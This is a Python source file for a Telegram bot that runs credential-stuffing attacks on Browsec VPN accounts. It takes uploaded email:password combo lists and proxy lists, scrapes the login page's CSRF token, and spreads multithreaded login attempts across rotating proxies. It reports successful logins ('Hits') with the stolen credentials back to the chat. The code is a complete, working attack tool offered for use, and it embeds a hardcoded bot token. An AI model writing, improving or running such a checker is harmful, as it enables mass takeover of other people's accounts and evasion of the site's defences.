import telebot
import requests
from bs4 import BeautifulSoup
import time
import itertools
import threading

TOKEN = '8072279299:AAH5u2FLs5jVEP_MjJ8uoAGI9bp0_cmabg8'
bot = telebot.TeleBot(TOKEN)

LOGIN_URL = 'https://browsec.com/en/login'

# User states and data storage
user_states = {}
# Structure example:
# user_states[user_id] = {
#   'status': 'waiting_combo' / 'waiting_proxy_type' / 'waiting_proxy_file' / 'waiting_bot_count' / 'checking' / 'stopped',
#   'combo_lines': [...],
#   'proxy_type': None,
#   'proxy_lines': [...],
#   'proxy_cycle': iterator,
#   'bot_count': int,
#   'threads': [],
#   'stop_flag': False,
#   counters: checked, hits, failures, retries,
#   checking_msg_id, checking_chat_id
# }

def reset_user_state(user_id):
    user_states[user_id] = {
        'status': 'waiting_combo',
        'combo_lines': [],
        'proxy_type': None,
        'proxy_lines': [],
        'proxy_cycle': None,
        'bot_count': 1,
        'threads': [],
        'stop_flag': False,
        'checked': 0,
        'hits': 0,
        'failures': 0,
        'retries': 0,
        'checking_msg_id': None,
        'checking_chat_id': None,
    }

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    reset_user_state(user_id)
    bot.reply_to(message, "Send me a .txt file with email:password on each line to check Browsec accounts.")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    user_id = message.from_user.id
    if user_id in user_states:
        user_states[user_id]['stop_flag'] = True
        user_states[user_id]['status'] = 'stopped'
        bot.reply_to(message, "Checking stopped. Send /start to begin again.")
    else:
        bot.reply_to(message, "Nothing is running. Send /start to begin.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if user_id not in user_states:
        bot.reply_to(message, "Please send /start first.")
        return

    state = user_states[user_id]

    if state['status'] == 'waiting_combo':
        # Receive combo file
        file_info = bot.get_file(message.document.file_id)
        file = bot.download_file(file_info.file_path)
        content = file.decode('utf-8', errors='ignore')
        lines = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
        if not lines:
            bot.reply_to(message, "The combo file is empty or invalid. Please send a valid .txt file with email:password lines.")
            return
        state['combo_lines'] = lines
        state['status'] = 'waiting_proxy_type'
        bot.reply_to(message,
                     "Add Proxy file.\n"
                     "/http if you want to send http proxy type\n"
                     "/socks4 if you want to send socks4 proxy type\n"
                     "/socks5 if you want to send socks5 proxy type\n"
                     "/noproxy if you want to skip proxy\n\n"
                     "Send one of these commands to choose proxy type.")
    elif state['status'] == 'waiting_proxy_file':
        # Receive proxy file
        file_info = bot.get_file(message.document.file_id)
        file = bot.download_file(file_info.file_path)
        content = file.decode('utf-8', errors='ignore')
        lines = [line.strip() for line in content.split('\n') if line.strip()]
        if not lines:
            bot.reply_to(message, "The proxy file is empty or invalid. Please send a valid proxy list or /noproxy to skip.")
            return
        state['proxy_lines'] = lines
        state['proxy_cycle'] = itertools.cycle(state['proxy_lines'])
        state['status'] = 'waiting_bot_count'
        bot.reply_to(message, "How many bots (threads) do you want to use? Send me a number (e.g. 5).")
    else:
        bot.reply_to(message, "I am not expecting a file now. Please follow instructions or send /stop and /start.")

@bot.message_handler(commands=['http', 'socks4', 'socks5', 'noproxy'])
def handle_proxy_type(message):
    user_id = message.from_user.id
    if user_id not in user_states:
        bot.reply_to(message, "Please send /start first.")
        return
    state = user_states[user_id]

    if state['status'] != 'waiting_proxy_type':
        bot.reply_to(message, "I am not expecting proxy type now. Please follow instructions or send /stop and /start.")
        return

    cmd = message.text.lower()
    if cmd == '/noproxy':
        state['proxy_type'] = None
        state['proxy_lines'] = []
        state['proxy_cycle'] = None
        state['status'] = 'waiting_bot_count'
        bot.reply_to(message, "How many bots (threads) do you want to use? Send me a number (e.g. 5).")
        return

    proxy_type_map = {
        '/http': 'http',
        '/socks4': 'socks4',
        '/socks5': 'socks5',
    }

    if cmd not in proxy_type_map:
        bot.reply_to(message, "Invalid proxy type command. Please send one of /http, /socks4, /socks5 or /noproxy.")
        return

    state['proxy_type'] = proxy_type_map[cmd]
    state['status'] = 'waiting_proxy_file'
    bot.reply_to(message, f"Send me your .txt proxy file for {state['proxy_type']} proxies, one proxy per line.")

@bot.message_handler(func=lambda m: m.text and m.text.isdigit())
def handle_bot_count(message):
    user_id = message.from_user.id
    if user_id not in user_states:
        return
    state = user_states[user_id]
    if state['status'] != 'waiting_bot_count':
        return
    bot_count = int(message.text)
    if bot_count < 1:
        bot.reply_to(message, "Please send a valid number greater than 0.")
        return
    state['bot_count'] = bot_count
    state['status'] = 'checking'
    bot.reply_to(message, f"Starting checking with {bot_count} bot(s)... You can send /stop anytime to stop checking.")
    threading.Thread(target=check_accounts_multithreaded, args=(message.chat.id, user_id), daemon=True).start()

def update_progress(user_id):
    state = user_states.get(user_id)
    if not state or not state['checking_msg_id'] or not state['checking_chat_id']:
        return
    try:
        bot.edit_message_text(
            f"Checked = {state['checked']}/{len(state['combo_lines'])}\n"
            f"Hits = {state['hits']}\n"
            f"Failure = {state['failures']}\n"
            f"Retry = {state['retries']}",
            state['checking_chat_id'],
            state['checking_msg_id']
        )
    except Exception:
        pass

def worker_thread(user_id, combos_slice):
    state = user_states.get(user_id)
    if not state:
        return
    session = requests.Session()
    for line in combos_slice:
        if state['stop_flag']:
            return
        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()
        while True:
            if state['stop_flag']:
                return
            try:
                resp = session.get(LOGIN_URL, timeout=15)
                soup = BeautifulSoup(resp.text, 'html.parser')
                token_input = soup.find("input", {"name": "authenticity_token"})
                if not token_input:
                    bot.send_message(state['checking_chat_id'], "Failed to get authenticity_token from login page. Stopping.")
                    state['status'] = 'stopped'
                    return
                token = token_input.get("value")
            except Exception:
                state['retries'] += 1
                update_progress(user_id)
                continue

            payload = {
                "authenticity_token": token,
                "email": email,
                "user[password]": password
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": LOGIN_URL,
                "User-Agent": "Mozilla/5.0"
            }

            proxies = None
            if state['proxy_type'] and state['proxy_cycle']:
                proxy = next(state['proxy_cycle'])
                proxy_url = f"{state['proxy_type']}://{proxy}"
                proxies = {
                    'http': proxy_url,
                    'https': proxy_url,
                }

            try:
                post_resp = session.post(LOGIN_URL, data=payload, headers=headers, timeout=15, proxies=proxies)
                text = post_resp.text
            except Exception:
                state['retries'] += 1
                update_progress(user_id)
                continue

            if "Sign out" in text:
                state['hits'] += 1
                state['checked'] += 1
                bot.send_message(state['checking_chat_id'],
                                 f"browsec Hits\n\n{email}:{password}")
                update_progress(user_id)
                break
            elif ("Incorrect password/email" in text) or ("Param is missing or the value is empty" in text):
                state['failures'] += 1
                state['checked'] += 1
                update_progress(user_id)
                break
            else:
                state['retries'] += 1
                update_progress(user_id)
                continue

def check_accounts_multithreaded(chat_id, user_id):
    state = user_states.get(user_id)
    if not state:
        return
    combos = state['combo_lines']
    total = len(combos)
    state['checked'] = 0
    state['hits'] = 0
    state['failures'] = 0
    state['retries'] = 0
    state['checking_msg_id'] = None
    state['checking_chat_id'] = chat_id

    progress_msg = bot.send_message(chat_id,
                                   f"Checked = 0/{total}\nHits = 0\nFailure = 0\nRetry = 0")
    state['checking_msg_id'] = progress_msg.message_id

    bot_count = state['bot_count']
    # Split combos into roughly equal chunks for each thread
    chunks = [combos[i::bot_count] for i in range(bot_count)]

    threads = []
    for chunk in chunks:
        t = threading.Thread(target=worker_thread, args=(user_id, chunk))
        t.start()
        threads.append(t)
    state['threads'] = threads

    # Wait for all threads to finish
    for t in threads:
        t.join()

    if not state['stop_flag']:
        bot.send_message(chat_id, "Checking completed.")
    else:
        bot.send_message(chat_id, "Checking stopped by user.")

    state['status'] = 'stopped'
    state['stop_flag'] = False

bot.infinity_polling()
